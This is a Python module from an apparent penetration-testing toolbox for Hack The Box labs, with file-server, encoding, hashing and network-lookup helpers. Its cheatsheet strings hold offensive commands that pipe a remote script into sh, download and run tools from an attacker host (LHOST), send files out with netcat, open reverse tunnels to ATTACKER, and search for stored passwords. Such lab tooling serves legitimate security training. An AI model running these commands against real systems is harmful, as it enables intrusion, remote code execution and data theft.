"""
HTB Toolbox — Utilities & Helpers Screens
"""
import os
import sys
import base64
import hashlib
import subprocess
import threading
import http.server
import socketserver

from ui.helpers import (
    console, pause, ask, ask_int, show_error, show_success, show_info,
    menu_header, render_menu, choose, get_project_or_warn, get_target_or_warn,
)
from core.config import get_tun0_ip
from rich.panel import Panel


TUNNELING_CHEATSHEET = """[bold cyan]Tunneling & Port Forwarding Cheatsheet:[/]

[yellow]SSH Local Port Forward (access remote service locally):[/]
  ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@pivot

[yellow]SSH Dynamic SOCKS Proxy:[/]
  ssh -D 1080 user@pivot
  proxychains4 nmap -sT -Pn TARGET

[yellow]SSH Remote Port Forward (expose your service to target):[/]
  ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@target

[yellow]Chisel (HTTP Tunnel):[/]
  # Attacker: chisel server -p 8000 --reverse
  # Target:   chisel client ATTACKER:8000 R:LPORT:127.0.0.1:RPORT

[yellow]Ligolo-ng:[/]
  # Attacker: ligolo-proxy -selfcert -laddr 0.0.0.0:11601
  # Target:   ligolo-agent -connect ATTACKER:11601 -ignore-cert

[yellow]Socat Port Forward:[/]
  socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET:REMOTE_PORT"""

PRIVESC_COMMANDS = """[bold cyan]Privilege Escalation Enumeration:[/]

[yellow]Download & run LinPEAS:[/]
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  # Or serve from attacker:
  wget http://LHOST:PORT/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

[yellow]Download & run WinPEAS:[/]
  certutil -urlcache -f http://LHOST:PORT/winPEASany.exe winpeas.exe
  .\\winpeas.exe

[yellow]Linux Manual Checks:[/]
  sudo -l                          # Check sudo permissions
  find / -perm -4000 2>/dev/null   # SUID binaries
  find / -perm -2000 2>/dev/null   # SGID binaries
  cat /etc/crontab                 # Cron jobs
  ls -la /etc/cron*                # Cron directories
  ps auxww                         # Running processes
  netstat -tulnp                   # Listening ports
  find / -writable -type d 2>/dev/null  # Writable directories
  cat /etc/passwd                  # Users
  ls -la /home/                    # Home directories
  env                              # Environment variables
  getcap -r / 2>/dev/null          # Linux capabilities

[yellow]Windows Manual Checks:[/]
  whoami /priv                     # Privileges
  whoami /groups                   # Groups
  net user                         # Users
  net localgroup administrators    # Local admins
  systeminfo                       # System info
  tasklist /svc                    # Services
  netstat -ano                     # Connections
  reg query HKLM /f password /t REG_SZ /s  # Registry passwords
  dir /s /b *.txt *.ini *.cfg *.xml  # Config files"""

FILE_TRANSFER_METHODS = """[bold cyan]File Transfer Methods:[/]

[yellow]Python HTTP Server (on attacker):[/]
  python3 -m http.server 8080

[yellow]Download on Linux target:[/]
  wget http://LHOST:8080/file
  curl http://LHOST:8080/file -o file
  # Bash only: cat < /dev/tcp/LHOST/8080 > file

[yellow]Download on Windows target:[/]
  certutil -urlcache -f http://LHOST:8080/file file.exe
  powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST:8080/file','file.exe')"
  powershell IWR -Uri http://LHOST:8080/file -OutFile file.exe
  bitsadmin /transfer job http://LHOST:8080/file C:\\temp\\file.exe

[yellow]Upload from target (SCP/NC):[/]
  scp file user@LHOST:/tmp/
  nc LHOST 9999 < file  # Attacker: nc -lvnp 9999 > file

[yellow]SMB Share (on attacker):[/]
  impacket-smbserver share . -smb2support
  # On Windows: copy \\\\LHOST\\share\\file ."""


def menu_utils():
    while True:
        menu_header()
        items = [
            ("1", "🌐", "Start HTTP File Server"),
            ("2", "🔄", "Base64 Encode / Decode"),
            ("3", "#️⃣ ", "Hash a String"),
            ("4", "📡", "Ping Target"),
            ("5", "🔀", "Traceroute Target"),
            ("6", "📂", "File Transfer Cheatsheet"),
            ("7", "🔓", "Privilege Escalation Cheatsheet"),
            ("8", "🚇", "Tunneling & Port Forward Cheatsheet"),
            ("9", "🔎", "Reverse DNS Lookup"),
        ]
        render_menu("Utilities & Helpers", items)
        c = choose(items)
        if c == "0": return
        elif c == "1": action_http_server()
        elif c == "2": action_base64()
        elif c == "3": action_hash_string()
        elif c == "4": action_ping()
        elif c == "5": action_traceroute()
        elif c == "6": action_file_transfer_cheatsheet()
        elif c == "7": action_privesc_cheatsheet()
        elif c == "8": action_tunneling_cheatsheet()
        elif c == "9": action_reverse_dns()


def action_http_server():
    menu_header("HTTP File Server")
    lhost = get_tun0_ip() or "0.0.0.0"
    port = ask_int("Port", 8080)
    directory = ask("Directory to serve", os.getcwd())

    if not os.path.isdir(directory):
        show_error("Directory not found.")
        pause()
        return

    console.print(f"\n  [bold green]🌐 Serving files from [cyan]{directory}[/] on port [cyan]{port}[/][/]")
    console.print(f"  [dim]URL: http://{lhost}:{port}/[/]")
    console.print("  [dim]Press Ctrl+C to stop.[/]\n")

    os.chdir(directory)
    handler = http.server.SimpleHTTPRequestHandler
    try:
        with socketserver.TCPServer(("", port), handler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n  [dim]Server stopped.[/]")
    except OSError as e:
        show_error(f"Could not start server: {e}")
    pause()


def action_base64():
    menu_header("Base64 Encode / Decode")
    console.print("    [cyan]1[/]. Encode")
    console.print("    [cyan]2[/]. Decode")
    c = ask("Mode", "1")

    text = ask("Text")
    if not text:
        return

    if c == "1":
        result = base64.b64encode(text.encode()).decode()
        console.print(f"\n  [bold]Encoded:[/] [cyan]{result}[/]")
    else:
        try:
            result = base64.b64decode(text).decode()
            console.print(f"\n  [bold]Decoded:[/] [cyan]{result}[/]")
        except Exception as e:
            show_error(f"Failed to decode: {e}")
    pause()


def action_hash_string():
    menu_header("Hash a String")
    text = ask("String to hash")
    if not text:
        return

    console.print(f"\n  [bold yellow]MD5:[/]    [cyan]{hashlib.md5(text.encode()).hexdigest()}[/]")
    console.print(f"  [bold yellow]SHA1:[/]   [cyan]{hashlib.sha1(text.encode()).hexdigest()}[/]")
    console.print(f"  [bold yellow]SHA256:[/] [cyan]{hashlib.sha256(text.encode()).hexdigest()}[/]")
    console.print(f"  [bold yellow]SHA512:[/] [cyan]{hashlib.sha512(text.encode()).hexdigest()}[/]")
    pause()


def action_ping():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("Ping Target")
    subprocess.run(["ping", "-c", "4", ip])
    pause()


def action_traceroute():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("Traceroute")
    try:
        subprocess.run(["traceroute", ip], timeout=30)
    except subprocess.TimeoutExpired:
        show_info("Traceroute timed out.")
    except FileNotFoundError:
        subprocess.run(["tracepath", ip], timeout=30)
    pause()


def action_file_transfer_cheatsheet():
    menu_header("File Transfer Methods")
    lhost = get_tun0_ip() or "LHOST"
    text = FILE_TRANSFER_METHODS.replace("LHOST", lhost)
    console.print(Panel(text, border_style="cyan", padding=(1, 2)))
    pause()


def action_privesc_cheatsheet():
    menu_header("Privilege Escalation Enumeration")
    lhost = get_tun0_ip() or "LHOST"
    text = PRIVESC_COMMANDS.replace("LHOST", lhost)
    console.print(Panel(text, border_style="cyan", padding=(1, 2)))
    pause()


def action_tunneling_cheatsheet():
    menu_header("Tunneling & Port Forwarding")
    console.print(Panel(TUNNELING_CHEATSHEET, border_style="cyan", padding=(1, 2)))
    pause()


def action_reverse_dns():
    data = get_project_or_warn()
    if not data:
        return
    ip = get_target_or_warn(data)
    if not ip:
        return

    menu_header("Reverse DNS Lookup")
    console.print(f"  [dim]Looking up {ip}...[/]\n")
    subprocess.run(["host", ip])
    console.print()
    subprocess.run(["dig", "-x", ip, "+short"])
    pause()
